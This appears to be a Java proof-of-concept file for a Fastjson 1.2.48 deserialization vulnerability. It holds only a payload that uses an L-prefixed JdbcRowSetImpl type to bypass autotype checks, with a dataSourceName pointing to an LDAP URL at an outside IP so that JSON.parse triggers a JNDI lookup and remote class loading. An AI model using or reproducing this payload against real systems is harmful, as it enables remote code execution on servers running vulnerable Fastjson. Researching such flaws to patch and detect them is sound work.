package com.firebasky.fastjson;

import com.alibaba.fastjson.JSON;

public class PoC_1_2_48 {
    public static void main(String[] args) {
        String poc = "{\"name\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://1.116.136.120:9999/badNameClass\", \"autoCommit\":true}}";
        JSON.parse(poc);
    }
}
